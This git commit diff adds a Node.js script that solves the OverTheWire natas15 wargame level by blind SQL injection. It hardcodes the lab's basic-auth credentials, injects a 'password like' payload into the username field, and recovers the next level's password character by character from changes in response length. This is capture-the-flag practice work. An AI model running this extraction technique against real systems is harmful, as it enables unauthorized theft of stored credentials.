185d79c89c4dd8627ea13ab3e913f97b21e8831a
MAjid H1 <majidh1@live.com>
2024-02-25 21:31:36 +0330

    init

--- app.js
+++ app.js
@@ -1,32 +1,74 @@
 const axios = require('axios');
+const querystring = require('querystring');
 var argv = require('minimist')(process.argv.slice(2));
 
 const options = {
-    url: "",
+    url: "http://natas15.natas.labs.overthewire.org/index.php",
     method: "POST",
-    body: {},
-    searchParams:[],
-    captchaUrl: "",
-    captchaMethod: "",
-    captchaPropName: "",
-    stopOnSuccess: true
+    body: {
+        username: ""
+    },
+    searchParams: ["username"],
+    stopOnSuccess: true,
+    stopOnChangeContent: true,
+    isFormData:true,
+    authUsername: "natas15",
+    authPassword: "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB",
+    listedChar: "QWERTYUIOPASDFGHJKLLZXCVBNMqwertyuiopasdfghjklzxcvbnm123456789",
+    maxLen: 32,
+    minLen: 32,
+    prefixValue: "natas16\" and password like \"TRD7IZ",
+    suffixValue: "%",
+    ongoing: true
 };
-Object.assign(options,argv);
-console.log(options);
+Object.assign(options, argv);
+let contentLength = null;
+let index = 0;
+dynamicValue = () => {
+    if (index > options.listedChar.length) throw "index";
+    return options.prefixValue + options.listedChar[index] + options.suffixValue
+}
 
-// Make a request for a user with a given ID
-axios(options.url,{
-    method: options.method,
-    body: options.body
-})
-    .then(function (response) {
-        // handle success
-        console.log(response);
-    })
-    .catch(function (error) {
-        // handle error
-        console.log(error);
-    })
-    .finally(function () {
-        // always executed
-    });
+getDynamicBody = () => {
+    let body = {};
+    Object.assign(body, options.body);
+    options.searchParams.forEach(param => body[param] = dynamicValue())
+    if(options.isFormData){
+        body = querystring.stringify(body);
+    }
+    return body;
+}
+
+sendRequest = () => {
+    const body = getDynamicBody();
+    axios(options.url, {
+            method: options.method,
+            data: body,
+            auth: {
+                username: options.authUsername,
+                password: options.authPassword
+            }
+        })
+        .then(function (response) {
+            if (contentLength === null) {
+                contentLength = response.data.length;
+            } else {
+                if (contentLength !== response.data.length) {
+                    console.log("finded: " + body);
+                    if(options.ongoing){
+                        options.prefixValue += options.listedChar[index]
+                        index = 0;
+                    }else return;
+                }
+            }
+            sendRequest();
+        })
+        .catch(function (error) {
+            throw error
+        })
+        .finally(function () {
+            index++;
+        });
+}
+
+sendRequest();
